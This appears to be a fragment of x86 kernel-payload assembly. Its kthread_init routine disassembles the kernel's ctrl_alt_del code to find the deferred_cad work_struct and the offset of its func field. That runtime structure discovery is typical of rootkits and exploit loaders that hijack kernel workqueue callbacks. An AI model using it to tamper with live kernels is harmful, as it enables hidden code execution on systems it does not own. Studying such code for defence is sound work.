
struct_work_struct: .fill 0x100
work_struct.func: .fill 4


// void kthread_init(); 
kthread_init:
#define retcode 0x14
	PUSH_ALL
	subl $0x18, %esp

	GET_VAL32(ctrl_alt_del, %eax)
	movl %eax, (%esp)
	movl $0x100, 0x4(%esp)
	call 1f
	.byte 0x00; .long 0x000000FF; .long 0x000000b8 
	.byte 's'; .byte 0x01; .long 0xFFFFFFFF
	.byte 'e'
1:	popl %eax
	movl %eax, 0x8(%esp)
	leal 0x10(%esp), %eax
	movl %eax, 0xc(%esp)
	call xde_find
	testl %eax, %eax
	jz kthread_init_out

	movl 0x10(%esp), %esi
	movl %esi, %ebp
	GET_ADDR(struct_work_struct, %edi)
	movl $0x100, %ecx
	cld; rep movsb
	
	GET_VAL32(deferred_cad, %eax)
	GET_ADDR(struct_work_struct, %esi)
	movl $0x100, %ecx
4:	cmpl %eax, (%esi)
	jz 5f
	cmpl %ebp, (%esi)
	jnz 6f
	movl %esi, (%esi)
	movl %esi, 4(%esi)

6:	incl %esi
	incl %ebp
	loop 4b
	xorl %eax, %eax
	jmp kthread_init_out

5:	GET_ADDR(struct_work_struct, %edi)
	subl %edi, %esi
	GET_ADDR(work_struct.func, %eax)
	movl %esi, (%eax)

#ifdef _DEBUG_
	movl %edi, 4(%esp)
	movl %esi, 8(%esp)
	DPRINT("<3>struct_work_struct %lx; work_struct.func %lx\n")
#endif

2:
kthread_init_out:
	movl retcode(%esp), %eax
	addl $0x18, %esp
	POP_ALL
	ret

#undef retcode
